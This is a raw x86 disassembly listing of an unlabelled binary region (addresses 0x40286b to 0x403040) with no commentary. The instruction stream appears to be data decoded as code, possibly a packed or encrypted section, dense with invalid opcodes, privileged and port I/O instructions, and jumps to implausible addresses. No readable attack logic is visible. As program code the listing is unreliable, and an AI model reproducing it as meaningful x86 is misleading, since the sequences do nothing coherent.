  40286b:	add    esp,DWORD PTR [eax+0x7e5a61c9]
  402871:	xor    eax,0x9aa8c3d5
  402876:	pop    edi
  402877:	outs   dx,BYTE PTR ds:[esi]
  402878:	into   
  402879:	or     DWORD PTR [ebx-0x2f14c5f],esi
  40287f:	sbb    al,0x5e
  402881:	xchg   esp,eax
  402882:	aaa    
  402883:	sub    BYTE PTR [ebx-0x4916897a],al
  402889:	xchg   ecx,eax
  40288a:	pop    ebx
  40288b:	test   al,0x5b
  40288d:	cli    
  40288e:	stc    
  40288f:	hlt    
  402890:	(bad)  
  402891:	popf   
  402892:	inc    ebx
  402893:	cmp    eax,0x250a82e2
  402898:	cmp    eax,0xf08e7e0a
  40289d:	pop    es
  40289e:	int3   
  40289f:	pusha  
  4028a0:	aam    0x4b
  4028a2:	push   ss
  4028a3:	cmp    DWORD PTR [ebp-0x63a44498],0x6c31f633
  4028ad:	fisttp DWORD PTR [ecx-0x2ac1f366]
  4028b3:	sub    BYTE PTR [edx],cl
  4028b5:	sub    al,0x38
  4028b7:	and    eax,0xfc035149
  4028bc:	mov    ebx,0xeec3616f
  4028c1:	dec    ecx
  4028c2:	dec    edi
  4028c3:	push   edx
  4028c4:	or     DWORD PTR ds:0x9c8ccea9,eax
  4028ca:	and    eax,0x5af6d651
  4028cf:	xchg   edx,eax
  4028d0:	in     al,0x13
  4028d2:	mov    cl,0x80
  4028d4:	jnp    0x402861
  4028d6:	push   es
  4028d7:	fmul   QWORD PTR [edi+edx*8+0x6507b450]
  4028de:	pop    ebp
  4028df:	push   ss
  4028e0:	dec    edx
  4028e1:	pop    edi
  4028e2:	(bad)  
  4028e4:	fcomip st,st(5)
  4028e6:	dec    ecx
  4028e7:	in     eax,dx
  4028e8:	mov    al,ds:0xb834646c
  4028ed:	dec    ecx
  4028ee:	test   al,0xd0
  4028f0:	mov    esp,0x2695ee10
  4028f5:	loope  0x402895
  4028f7:	ins    BYTE PTR es:[edi],dx
  4028f8:	cli    
  4028f9:	mov    ds:0xee65d1a0,eax
  4028fe:	push   edi
  4028ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402900:	repz add BYTE PTR [esi+0x14],al
  402904:	pop    ebp
  402905:	cli    
  402906:	push   esi
  402907:	lods   al,BYTE PTR ds:[esi]
  402908:	jge    0x4028f8
  40290a:	mov    eax,ds
  40290c:	aad    0xf8
  40290e:	inc    ebx
  40290f:	add    al,0xad
  402911:	jl     0x40290c
  402913:	dec    edi
  402914:	test   eax,0x96efea8a
  402919:	mov    WORD PTR [edx+ebp*1-0x1a9ccf7b],gs
  402920:	mov    eax,ds:0xd97ed54a
  402925:	jmp    0x8abd4667
  40292a:	mov    ch,BYTE PTR [edx+0x38b8312a]
  402930:	jne    0x402967
  402932:	xchg   edx,eax
  402933:	xor    DWORD PTR [eax-0x6bf96ad1],0x75
  40293a:	jp     0x4028c0
  40293c:	and    cl,ch
  40293e:	push   edx
  40293f:	enter  0xe680,0x46
  402943:	xchg   esi,eax
  402944:	popa   
  402945:	popa   
  402946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402947:	in     al,0x78
  402949:	in     al,0xf6
  40294b:	das    
  40294c:	scas   eax,DWORD PTR es:[edi]
  40294d:	adc    eax,0x2a998a09
  402952:	gs push esi
  402954:	sbb    DWORD PTR [ecx+0x4f],0x41
  402958:	repz push cs
  40295a:	add    cl,BYTE PTR [edi+0x11a608c9]
  402960:	cli    
  402961:	jmp    0x402921
  402963:	push   ecx
  402964:	test   BYTE PTR [eax],dh
  402966:	neg    DWORD PTR [ebx-0x19ae3af8]
  40296c:	lods   eax,DWORD PTR ds:[esi]
  40296d:	push   eax
  40296e:	xor    DWORD PTR [ecx],ecx
  402970:	pop    ss
  402971:	pop    ecx
  402972:	imul   esp,DWORD PTR [esi+0x20],0x1e35dca8
  402979:	push   es
  40297a:	mov    al,0x57
  40297c:	test   DWORD PTR [edx+0x2b],0xc143e471
  402983:	pop    edx
  402984:	add    cl,BYTE PTR ds:0x1fa5087
  40298a:	daa    
  40298b:	xor    esp,DWORD PTR [ebx-0xb844572]
  402991:	jecxz  0x40295e
  402993:	mov    gs:0xac6c1fea,eax
  402999:	pop    edi
  40299a:	mov    fs,WORD PTR [esi+eiz*8+0x7bc52b27]
  4029a1:	mov    dh,0x4c
  4029a3:	inc    ebp
  4029a4:	int3   
  4029a5:	dec    edx
  4029a6:	lahf   
  4029a7:	retf   
  4029a8:	cwde   
  4029a9:	ret    0xfdee
  4029ac:	push   eax
  4029ad:	shl    BYTE PTR [edi],1
  4029af:	jne    0x4029f5
  4029b1:	les    ebx,FWORD PTR ds:[ecx+0x8]
  4029b5:	fidiv  WORD PTR cs:[eax+0x7c]
  4029b9:	jno    0x402a10
  4029bb:	or     eax,0x727c7020
  4029c0:	mov    bh,0x69
  4029c2:	pop    ebp
  4029c3:	sbb    BYTE PTR [eax],cl
  4029c5:	sbb    bl,BYTE PTR [ebp+0x7bfda336]
  4029cb:	mov    dh,0x6a
  4029cd:	mov    esi,0xe16c918a
  4029d2:	jecxz  0x4029b4
  4029d4:	push   ecx
  4029d5:	repnz add ah,dl
  4029d8:	(bad)  
  4029d9:	mov    eax,0xb1440cee
  4029de:	or     BYTE PTR [ebx+0x1f],ch
  4029e1:	int    0xbc
  4029e3:	sub    BYTE PTR [edi+ebx*8-0x2],0x82
  4029e8:	add    esp,DWORD PTR [eax-0x118980d5]
  4029ee:	pop    es
  4029ef:	fs (bad) 
  4029f1:	cmp    DWORD PTR [edi],ebp
  4029f3:	pop    esp
  4029f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f5:	in     eax,0x5e
  4029f7:	cli    
  4029f8:	xchg   esi,eax
  4029f9:	lea    ebp,[edx+0x38c5c0be]
  4029ff:	hlt    
  402a00:	pop    edx
  402a01:	(bad)  
  402a02:	fcmovnb st,st(6)
  402a04:	adc    DWORD PTR [ecx-0x50],edx
  402a07:	lods   eax,DWORD PTR ds:[esi]
  402a08:	mov    dh,0x12
  402a0a:	(bad)  
  402a0d:	push   ebp
  402a0e:	inc    edi
  402a0f:	jne    0x4029f9
  402a11:	sbb    ecx,ecx
  402a13:	cmp    ch,BYTE PTR [edx+edi*8-0x6]
  402a17:	push   es
  402a18:	sbb    DWORD PTR [edi],esi
  402a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a1b:	mov    bl,0xd1
  402a1d:	mov    ebx,0xde0e2b01
  402a22:	das    
  402a23:	int    0x5e
  402a25:	push   0xffffff97
  402a27:	adc    BYTE PTR [edx-0x4d],bl
  402a2a:	dec    ecx
  402a2b:	mov    dh,0xd2
  402a2d:	add    BYTE PTR [ebp+0x4b],bl
  402a30:	pusha  
  402a31:	stos   DWORD PTR es:[edi],eax
  402a32:	push   ebx
  402a33:	clc    
  402a34:	inc    esi
  402a35:	dec    edi
  402a36:	bound  edi,QWORD PTR [esi-0x72]
  402a39:	mov    ds:0xc076464c,eax
  402a3e:	(bad)  
  402a40:	pop    edx
  402a41:	test   eax,0xc14ab1f
  402a46:	mov    eax,0x4676e680
  402a4b:	cld    
  402a4c:	(bad)  
  402a4d:	imul   eax,DWORD PTR [ecx+0x45],0x14
  402a51:	stc    
  402a52:	jmp    0x2bffbd5e
  402a57:	dec    ebp
  402a58:	mov    cl,BYTE PTR [ecx-0x164e7b32]
  402a5e:	or     ebx,ebp
  402a60:	or     bh,ch
  402a62:	dec    edx
  402a63:	cmp    esp,DWORD PTR [esp+ecx*8+0x56]
  402a67:	mov    ecx,0x6d416611
  402a6c:	push   es
  402a6d:	jg     0x402a69
  402a6f:	push   edi
  402a70:	push   0xa72dadbd
  402a75:	xor    dh,dh
  402a77:	mov    WORD PTR [ebx],ss
  402a79:	mov    cl,0xf1
  402a7b:	add    bh,cl
  402a7d:	int    0x19
  402a7f:	jnp    0x402a6b
  402a81:	lods   al,BYTE PTR ds:[esi]
  402a82:	jmp    0x7b4725b3
  402a87:	bound  edx,QWORD PTR [esi]
  402a89:	sar    DWORD PTR [ebx],1
  402a8b:	aam    0x2d
  402a8d:	fsub   DWORD PTR [ebx]
  402a8f:	data16 aas 
  402a91:	sti    
  402a92:	push   es
  402a93:	pop    edx
  402a94:	adc    eax,0xfa5ded56
  402a99:	in     al,dx
  402a9a:	das    
  402a9b:	clc    
  402a9c:	mov    dh,0x2
  402a9e:	jmp    0x402ac3
  402aa0:	push   0x46dac488
  402aa5:	sysenter 
  402aa7:	dec    esp
  402aa8:	cld    
  402aa9:	in     eax,0xea
  402aab:	jmp    0xd5a0d47c
  402ab0:	test   BYTE PTR [edx-0x38],ah
  402ab3:	loope  0x402a3c
  402ab5:	ror    DWORD PTR [edi-0x207f1005],cl
  402abb:	out    0xf2,eax
  402abd:	aam    0xb
  402abf:	sbb    al,0x74
  402ac1:	leave  
  402ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ac3:	sub    BYTE PTR [eax],al
  402ac5:	jno    0x402a52
  402ac7:	bound  edi,QWORD PTR [ecx-0x4996c6cc]
  402acd:	std    
  402ace:	xchg   ah,ch
  402ad0:	adc    ecx,DWORD PTR [ecx-0x67]
  402ad3:	stos   DWORD PTR es:[edi],eax
  402ad4:	(bad)  
  402ad5:	fwait
  402ad6:	xor    al,0x8d
  402ad8:	mov    al,0x8e
  402ada:	enter  0x2997,0xdd
  402ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402adf:	push   cs
  402ae0:	pop    eax
  402ae1:	outs   dx,BYTE PTR ds:[esi]
  402ae2:	add    edi,DWORD PTR [esi-0x74]
  402ae5:	int3   
  402ae6:	push   esp
  402ae7:	cld    
  402ae8:	test   al,0x65
  402aea:	push   ss
  402aeb:	nop
  402aec:	xlat   BYTE PTR ds:[ebx]
  402aed:	fs push es
  402aef:	inc    esp
  402af0:	in     al,dx
  402af1:	js     0x402a9b
  402af3:	xchg   ebp,eax
  402af4:	stc    
  402af5:	int    0x6b
  402af7:	stos   BYTE PTR es:[edi],al
  402af8:	pop    ss
  402af9:	(bad)  [eax-0xbef2c7d]
  402aff:	pop    ds
  402b00:	call   0x7363203b
  402b05:	add    al,0xb2
  402b08:	loop   0x402b4e
  402b0a:	(bad)  
  402b0b:	jmp    0x402afd
  402b0d:	sbb    cl,BYTE PTR [edi-0x60]
  402b10:	in     eax,0xa4
  402b12:	xchg   ebx,eax
  402b13:	mov    ds:0xfa65a54a,eax
  402b18:	inc    ebp
  402b19:	adc    BYTE PTR [edi],dh
  402b1b:	loopne 0x402b1f
  402b1d:	jecxz  0x402b1e
  402b1f:	iret   
  402b20:	sbb    BYTE PTR [ecx-0x3e937c55],al
  402b26:	int    0xa8
  402b28:	std    
  402b29:	mov    esi,0x73e6880
  402b2e:	push   ss
  402b2f:	test   eax,0xbc34d1fd
  402b34:	popf   
  402b35:	hlt    
  402b36:	jno    0x402b04
  402b38:	sub    bl,BYTE PTR [edx]
  402b3a:	ins    BYTE PTR es:[edi],dx
  402b3b:	int    0x72
  402b3d:	fist   WORD PTR [ecx+0x6c3ba67e]
  402b43:	xchg   BYTE PTR [eax],bl
  402b45:	push   ss
  402b46:	(bad)  [ebx+0x12]
  402b49:	test   BYTE PTR [eax-0x535e3e21],0x42
  402b50:	test   al,0x14
  402b52:	test   BYTE PTR [ecx+0x14],ch
  402b55:	sub    ebx,edi
  402b57:	xor    eax,0x38ed10fd
  402b5c:	inc    esi
  402b5d:	sub    DWORD PTR [ebp+0x25],esi
  402b60:	mov    dl,0x4c
  402b62:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402b64:	mov    ecx,0xd7a95a5c
  402b69:	mov    ah,0x15
  402b6b:	stos   DWORD PTR es:[edi],eax
  402b6c:	sub    bl,BYTE PTR [ecx+0x7]
  402b6f:	pusha  
  402b70:	dec    esp
  402b71:	ds pop edx
  402b73:	sbb    eax,0x13cebf35
  402b78:	es mov bh,0x70
  402b7b:	cmp    DWORD PTR [ecx-0x5d],0x36e1de11
  402b82:	push   cs
  402b83:	mov    esi,0x701b63b7
  402b88:	and    bh,BYTE PTR [ecx-0x4b]
  402b8b:	sbb    ch,BYTE PTR [edi]
  402b8d:	lock push es
  402b8f:	ss (bad) 
  402b91:	cmp    esi,eax
  402b93:	sub    al,0xa5
  402b95:	stos   DWORD PTR es:[edi],eax
  402b96:	jbe    0x402ba6
  402b98:	adc    ch,BYTE PTR [esi]
  402b9a:	daa    
  402b9b:	adc    DWORD PTR [esp+edx*8],esp
  402b9e:	inc    edx
  402b9f:	xchg   edx,eax
  402ba0:	(bad)  
  402ba1:	mov    ebp,0x9110882b
  402ba6:	neg    DWORD PTR [ebp-0x22]
  402ba9:	cmp    ch,0x30
  402bac:	jle    0x402b7a
  402bae:	(bad)  
  402baf:	retf   0x6d92
  402bb2:	adc    DWORD PTR [ebp+0x57],eax
  402bb5:	sbb    eax,DWORD PTR [esp+ebx*1+0x3d32bb07]
  402bbc:	add    ebp,DWORD PTR [ecx+edx*4-0x5a]
  402bc0:	cmp    ebx,edi
  402bc2:	adc    eax,0xa96a62e
  402bc7:	and    edi,DWORD PTR [ebx+0x65]
  402bca:	retf   
  402bcb:	iret   
  402bcc:	out    dx,al
  402bcd:	pop    esi
  402bce:	inc    ebx
  402bcf:	repz fisub DWORD PTR [ebp+0x10]
  402bd3:	fs mov bl,0xe8
  402bd6:	mov    fs,esi
  402bd8:	mov    ch,0x68
  402bda:	xchg   edi,eax
  402bdb:	sbb    BYTE PTR [ecx+0x58f445fe],bh
  402be1:	mov    esp,0x560ce15
  402be6:	cli    
  402be7:	jo     0x402bf7
  402be9:	(bad)  
  402bea:	pop    ebx
  402beb:	push   es
  402bec:	push   edi
  402bed:	pushf  
  402bee:	xor    dh,ch
  402bf0:	and    dl,BYTE PTR ds:0x22b075a6
  402bf6:	cs mov ah,0xba
  402bf9:	pop    ebx
  402bfa:	stc    
  402bfb:	(bad)  
  402bfc:	call   0x7a48:0x99319f91
  402c03:	int    0xff
  402c05:	hlt    
  402c06:	xor    eax,0xcd8dd656
  402c0b:	adc    eax,0xe2e7ec50
  402c10:	fbld   TBYTE PTR [ebp+esi*4-0x61424d36]
  402c17:	dec    esp
  402c18:	xor    DWORD PTR [ebp-0x3fc8db0d],0xffffff88
  402c1f:	mov    ds:0xf80c02e2,eax
  402c24:	or     BYTE PTR [edi+0x2760a84d],ah
  402c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c2b:	data16 jb 0x402c60
  402c2e:	ret    0x9851
  402c31:	and    al,0x56
  402c33:	int    0x7e
  402c35:	into   
  402c36:	out    dx,eax
  402c37:	daa    
  402c38:	push   es
  402c39:	add    si,WORD PTR [ecx]
  402c3c:	ss or  bl,al
  402c3f:	call   0xc1e7:0x1a68c4b5
  402c46:	jecxz  0x402c2c
  402c48:	cmp    ch,bl
  402c4a:	add    edi,DWORD PTR [esi]
  402c4c:	cli    
  402c4d:	sbb    eax,0x157c8f1e
  402c52:	adc    cl,BYTE PTR [edx+ecx*1]
  402c55:	ds jnp 0x402c1b
  402c58:	sub    BYTE PTR [ecx-0x7d78f7a5],ch
  402c5e:	mov    al,0x54
  402c60:	push   0x15da1ebf
  402c65:	gs cmp BYTE PTR fs:[ebx+0x8242cc],al
  402c6d:	adc    DWORD PTR [ecx],0xffffffcb
  402c70:	xchg   esi,eax
  402c71:	in     eax,dx
  402c72:	fsub   QWORD PTR [ebp-0x4b2b008b]
  402c78:	ret    
  402c79:	aas    
  402c7a:	xchg   esi,eax
  402c7b:	and    DWORD PTR [esi+0x16],ecx
  402c7e:	stc    
  402c7f:	push   ds
  402c80:	sbb    ecx,DWORD PTR [eax+0x1db3b548]
  402c86:	addr16 jne 0x402c2c
  402c89:	xchg   edx,eax
  402c8a:	jl     0x402c44
  402c8c:	test   al,0xf
  402c8e:	push   es
  402c8f:	pop    ss
  402c90:	add    ch,BYTE PTR [ebx+0x1ead3fba]
  402c96:	jl     0x402c86
  402c98:	pop    es
  402c99:	push   ss
  402c9a:	lds    edi,FWORD PTR [ecx-0x6e]
  402c9d:	into   
  402c9e:	dec    esi
  402c9f:	add    BYTE PTR [esi-0x529a8a27],ah
  402ca5:	lods   al,BYTE PTR ds:[esi]
  402ca6:	xchg   esi,eax
  402ca7:	pop    ds
  402ca8:	rcl    ebp,1
  402caa:	push   ds
  402cab:	jnp    0x402c42
  402cad:	add    eax,0x7b2bb2cd
  402cb2:	sbb    al,0xc6
  402cb4:	pop    eax
  402cb5:	ins    BYTE PTR es:[edi],dx
  402cb6:	mov    edi,0x1e14cf64
  402cbb:	mov    ds:0x3c43124e,eax
  402cc0:	sti    
  402cc1:	dec    edx
  402cc2:	sbb    al,0x7
  402cc4:	jb     0x402c8d
  402cc6:	and    cl,dl
  402cc8:	jecxz  0x402cba
  402cca:	jp     0x402d3b
  402ccc:	adc    bl,BYTE PTR [ecx+0x30]
  402ccf:	add    eax,0x826a200
  402cd4:	inc    edi
  402cd5:	outs   dx,DWORD PTR ds:[esi]
  402cd6:	add    al,ah
  402cd8:	mov    esp,0x5069e5fc
  402cdd:	out    dx,eax
  402cde:	(bad)  
  402cdf:	adc    eax,0xa316c847
  402ce4:	cld    
  402ce5:	nop
  402ce6:	sbb    BYTE PTR ds:0xdae6721d,0xc7
  402ced:	and    eax,0xd70f693c
  402cf2:	add    esp,ebp
  402cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cf5:	iret   
  402cf6:	push   eax
  402cf7:	xchg   ebx,eax
  402cf8:	(bad)  
  402cf9:	shl    bh,1
  402cfb:	mov    bh,0x5c
  402cfd:	mov    eax,ds:0xbc1bb986
  402d02:	int    0x2a
  402d04:	inc    esi
  402d05:	xor    edi,ebp
  402d07:	dec    ebx
  402d08:	mov    BYTE PTR [ecx],dh
  402d0a:	je     0x402cef
  402d0c:	(bad)  
  402d0d:	icebp  
  402d0e:	int    0x3a
  402d10:	data16 jns 0x402d5a
  402d13:	mov    ecx,0x55849b8d
  402d18:	mov    ds:0x4cf5f64f,eax
  402d1d:	mov    esp,0x1aecb203
  402d22:	shr    DWORD PTR [edi-0x70cdb6d6],1
  402d28:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  402d2a:	int    0x1d
  402d2c:	push   edx
  402d2d:	and    dl,dh
  402d2f:	jmp    0x1c2c:0x2eba50de
  402d36:	sar    BYTE PTR [ebx],cl
  402d38:	jge    0x402d62
  402d3a:	shl    dh,cl
  402d3c:	jecxz  0x402d39
  402d3e:	out    dx,eax
  402d3f:	pop    eax
  402d40:	push   ebx
  402d41:	es jl  0x402ce4
  402d44:	out    0xfe,al
  402d46:	sub    edi,DWORD PTR [esi]
  402d48:	stc    
  402d49:	lock xadd BYTE PTR [ebx-0x3477a115],cl
  402d51:	pop    esp
  402d52:	pushf  
  402d53:	cwde   
  402d54:	inc    ebx
  402d55:	sub    eax,0xe0d0a600
  402d5a:	mov    esi,DWORD PTR [ecx-0x12]
  402d5d:	lds    esi,FWORD PTR [edi+0x3e5cc3e5]
  402d63:	cmp    BYTE PTR [eax],0x56
  402d66:	dec    ebx
  402d67:	jnp    0x402d14
  402d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d6a:	mov    WORD PTR [edx+0x67],?
  402d6d:	out    dx,eax
  402d6e:	fsubr  st,st(6)
  402d70:	cwde   
  402d71:	test   DWORD PTR [ebx],ecx
  402d73:	repz int 0x7c
  402d76:	push   edx
  402d77:	ror    DWORD PTR [edx+edx*4-0x22],0xbf
  402d7c:	(bad)  
  402d7d:	in     eax,0x8e
  402d7f:	popf   
  402d80:	leave  
  402d81:	mov    ebx,0x5266ffe6
  402d86:	fld    DWORD PTR [edx-0x69b83fb]
  402d8c:	and    dl,dl
  402d8e:	popa   
  402d8f:	lods   eax,DWORD PTR ds:[esi]
  402d90:	lahf   
  402d91:	push   0xe6f8d275
  402d96:	jnp    0x402d65
  402d98:	push   ss
  402d99:	add    dl,BYTE PTR [ebx]
  402d9b:	repnz mov dh,0x5
  402d9e:	sbb    al,0xac
  402da0:	xor    al,0x1b
  402da2:	push   ds
  402da3:	and    eax,0x8f7df30f
  402da8:	mov    ebp,0x8843f5ac
  402dad:	cmp    eax,0x6108ebd
  402db2:	mov    cs,WORD PTR [ebp+0x1cc48fb3]
  402db8:	jns    0x402d76
  402dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dbb:	pop    edi
  402dbc:	add    edx,eax
  402dbe:	sbb    bl,BYTE PTR [ebx]
  402dc0:	ins    DWORD PTR es:[edi],dx
  402dc1:	mov    al,0xd3
  402dc3:	jl     0x402d95
  402dc5:	xchg   esp,eax
  402dc6:	loope  0x402d9d
  402dc8:	xor    eax,0xefacb2e9
  402dcd:	dec    esp
  402dce:	xor    edi,DWORD PTR [ecx-0x68]
  402dd1:	daa    
  402dd2:	test   al,0xb2
  402dd4:	pop    edx
  402dd5:	push   0xffffffaf
  402dd7:	mov    esp,0xa0aa1ba5
  402ddc:	sbb    DWORD PTR [eax-0x66],ebx
  402ddf:	xchg   ebx,eax
  402de0:	ins    BYTE PTR es:[edi],dx
  402de1:	push   edi
  402de2:	sbb    DWORD PTR [esi-0x11e53db7],ebp
  402de8:	fchs   
  402dea:	test   DWORD PTR [eax],ecx
  402dec:	sub    eax,0xd348ac56
  402df1:	inc    DWORD PTR [edx-0x2f]
  402df4:	call   0x4c31:0x50a0c014
  402dfb:	mov    ebx,0xef250473
  402e00:	and    esi,DWORD PTR [eax-0x239efe2e]
  402e06:	mov    ?,WORD PTR ds:0x3ec3ced8
  402e0c:	sub    eax,esp
  402e0e:	inc    esp
  402e0f:	pusha  
  402e10:	rol    DWORD PTR [ebp+ebp*8+0x59],1
  402e14:	std    
  402e15:	xchg   esi,eax
  402e16:	xchg   BYTE PTR [esi],al
  402e18:	fld    TBYTE PTR [ebx+eax*8]
  402e1b:	(bad)  
  402e1c:	clc    
  402e1d:	repnz cwde 
  402e1f:	mov    dl,ah
  402e21:	outs   dx,BYTE PTR ds:[esi]
  402e22:	mov    ecx,0x4f0ea911
  402e27:	sbb    BYTE PTR ds:0x449d0d12,dl
  402e2d:	ins    BYTE PTR es:[edi],dx
  402e2e:	xchg   DWORD PTR [edx-0x22479c53],ebx
  402e34:	cmp    al,0xe2
  402e36:	shr    DWORD PTR [eax+ebp*2-0x24147131],1
  402e3d:	outs   dx,BYTE PTR ds:[esi]
  402e3e:	pandn  mm3,QWORD PTR es:[edi-0x51]
  402e43:	mov    ah,0xca
  402e45:	in     al,0xde
  402e47:	pusha  
  402e48:	xchg   edi,eax
  402e49:	ret    
  402e4a:	mov    ds:0xbc852af9,al
  402e4f:	mov    esp,0xacfa7c59
  402e54:	mov    cl,BYTE PTR [edi]
  402e56:	or     BYTE PTR [ecx+esi*2],cl
  402e59:	add    ebx,esi
  402e5b:	imul   edi,DWORD PTR [edx+eax*8-0x1f4766],0x16a704b8
  402e66:	xchg   cl,ah
  402e68:	push   ebp
  402e69:	push   eax
  402e6a:	rcl    DWORD PTR [ebp+0xe42f284],0xff
  402e71:	push   es
  402e72:	mov    cl,0x9
  402e74:	out    dx,eax
  402e75:	sub    al,0x7c
  402e77:	adc    DWORD PTR [ebx+0x5d6d261c],ebp
  402e7d:	sub    esp,ebx
  402e7f:	pop    esi
  402e80:	adc    al,0x85
  402e82:	daa    
  402e83:	xor    eax,0xbd5b98ec
  402e88:	xor    eax,0xb2ed152f
  402e8d:	ror    DWORD PTR [edx-0x41b1fedc],0xdb
  402e94:	ss dec esi
  402e96:	daa    
  402e97:	or     ch,bl
  402e99:	push   edx
  402e9a:	sti    
  402e9b:	push   esp
  402e9c:	dec    ecx
  402e9d:	sub    al,0x1
  402e9f:	jmp    0x403fc2dd
  402ea4:	xchg   esi,eax
  402ea5:	inc    ebx
  402ea6:	lea    esp,[esi]
  402ea8:	jb     0x402ef9
  402eaa:	imul   ecx,DWORD PTR [esi+0x3b],0xffffffc5
  402eae:	and    al,0x9a
  402eb0:	or     ebx,DWORD PTR [esi-0x61247484]
  402eb6:	push   0xf3e96c4f
  402ebb:	add    BYTE PTR [edi],bh
  402ebd:	mov    al,cs:0xf113138
  402ec3:	in     al,dx
  402ec4:	or     al,0xcc
  402ec6:	xchg   edi,eax
  402ec7:	loopne 0x402ea1
  402ec9:	and    DWORD PTR [eax-0x41],0x30d916e2
  402ed0:	sub    al,BYTE PTR [edx-0x3765ec9]
  402ed6:	add    eax,0x9d2b4aba
  402edb:	sbb    BYTE PTR [ebx+0x6b],dl
  402ede:	js     0x402f0c
  402ee0:	popa   
  402ee1:	out    0xdc,al
  402ee3:	and    DWORD PTR [edx],0x9
  402ee6:	add    DWORD PTR [ecx-0x24],esi
  402ee9:	jae    0x402f0c
  402eeb:	sub    bl,dh
  402eed:	jmp    0x9b7282c4
  402ef2:	les    edi,FWORD PTR [edx+0xc]
  402ef5:	test   al,0x9c
  402ef7:	mov    ds:0x9e42dc04,al
  402efc:	push   ss
  402efd:	in     eax,dx
  402efe:	aad    0x3c
  402f00:	retf   0xe34f
  402f03:	rol    DWORD PTR [eax-0x54],1
  402f06:	push   edi
  402f07:	rol    eax,1
  402f09:	sar    ah,1
  402f0b:	stos   DWORD PTR es:[edi],eax
  402f0c:	cld    
  402f0d:	test   eax,0x9aad59e0
  402f12:	pop    edi
  402f13:	dec    edi
  402f14:	sbb    al,0xd8
  402f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f17:	scas   eax,DWORD PTR es:[edi]
  402f18:	add    al,0xdf
  402f1a:	cmp    ah,dl
  402f1c:	(bad)
  402f1f:	les    edx,FWORD PTR [esi+0x5e777c63]
  402f25:	std    
  402f26:	inc    eax
  402f27:	sahf   
  402f28:	in     al,0x0
  402f2a:	in     eax,0x7b
  402f2c:	fadd   DWORD PTR ds:0x31f7260b
  402f32:	or     DWORD PTR ds:0x4ad8e7cc,edi
  402f38:	xchg   esp,eax
  402f39:	cmp    eax,DWORD PTR [eax+0xd]
  402f3c:	call   0x4d92c28a
  402f41:	mov    edx,0x6627dbbe
  402f46:	or     eax,0xf9ed5f65
  402f4b:	std    
  402f4c:	out    dx,al
  402f4d:	push   ebx
  402f4e:	retf   
  402f4f:	scas   al,BYTE PTR es:[edi]
  402f50:	int3   
  402f51:	sbb    BYTE PTR [eax-0x20392738],dl
  402f57:	test   DWORD PTR [edi],ebx
  402f59:	retf   0xf198
  402f5c:	ror    BYTE PTR [edx-0x7],cl
  402f5f:	leave  
  402f60:	jmp    0x402fba
  402f62:	and    BYTE PTR [ebx-0x503fe180],0x6
  402f69:	pop    edi
  402f6a:	in     al,dx
  402f6b:	mov    edx,0x8e475294
  402f70:	sbb    edi,DWORD PTR [ebx+0x29445ca3]
  402f76:	inc    ecx
  402f77:	sub    dh,BYTE PTR cs:[eax]
  402f7a:	mul    DWORD PTR [edi-0x28978f13]
  402f80:	jle    0x402f34
  402f82:	js     0x402f3b
  402f84:	outs   dx,DWORD PTR ds:[esi]
  402f85:	sub    al,0x23
  402f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f88:	aas    
  402f89:	pusha  
  402f8a:	outs   dx,BYTE PTR ds:[esi]
  402f8b:	pop    DWORD PTR [ecx]
  402f8d:	pop    edx
  402f8e:	xor    BYTE PTR [ebx+0x3a],bl
  402f91:	or     DWORD PTR [edx+0x6d],ebx
  402f94:	dec    edi
  402f95:	sbb    al,0x5
  402f97:	xchg   esp,eax
  402f98:	data16 sub ch,BYTE PTR [ebx+0x258fe095]
  402f9f:	ret    0x3675
  402fa2:	loopne 0x402f8b
  402fa4:	pop    eax
  402fa5:	in     al,dx
  402fa6:	add    al,0xe
  402fa8:	jbe    0x402f53
  402faa:	pop    ds
  402fab:	xchg   ebx,eax
  402fac:	mov    ecx,0xc42ded4c
  402fb1:	xor    edx,DWORD PTR [ecx-0x16d29749]
  402fb7:	jge    0x402f63
  402fb9:	jg     0x402fb7
  402fbb:	loope  0x402fc9
  402fbd:	and    eax,0x8302bbe4
  402fc2:	jmp    0x3ea37984
  402fc7:	jg     0x402f49
  402fc9:	push   0xbd415be4
  402fce:	in     eax,0xce
  402fd0:	cmp    ah,0x4d
  402fd3:	mov    esp,0x14bbe150
  402fd8:	or     eax,0xd4eba0b6
  402fdd:	adc    eax,0x6fe6b24e
  402fe2:	sub    DWORD PTR [ebx+esi*1],0x1a1bcae1
  402fe9:	sbb    eax,0x6d12679f
  402fee:	cmp    cl,BYTE PTR ds:0x903f773a
  402ff4:	enter  0x908a,0xa4
  402ff8:	inc    esp
  402ff9:	inc    ebp
  402ffa:	sub    cl,cl
  402ffc:	inc    eax
  402ffd:	test   DWORD PTR [ecx+0x8],esi
  403000:	aaa    
  403001:	pop    edx
  403002:	inc    ebp
  403003:	jne    0x40301c
  403005:	mov    ds:0x3774595d,eax
  40300a:	pushf  
  40300b:	sahf   
  40300c:	or     BYTE PTR [esi+0x4af9c6ff],ch
  403012:	iret   
  403013:	(bad)  
  403014:	adc    al,BYTE PTR [esi+edx*4]
  403017:	not    BYTE PTR [ecx]
  403019:	add    dl,BYTE PTR [esi-0x30]
  40301c:	mov    ah,BYTE PTR [eax-0x2701a80b]
  403022:	push   ss
  403023:	xchg   BYTE PTR ds:0x7173e3f5,al
  403029:	jae    0x402ff2
  40302b:	pop    ecx
  40302c:	imul   edi,DWORD PTR [eax],0xca342159
  403032:	lods   eax,DWORD PTR ds:[esi]
  403033:	sar    DWORD PTR [edi],cl
  403035:	jmp    0x402fc9
  403037:	pop    ds
  403038:	add    al,0x88
  40303a:	pop    esp
  40303b:	xchg   DWORD PTR [ebx+0x37],esp
  40303e:	pop    eax
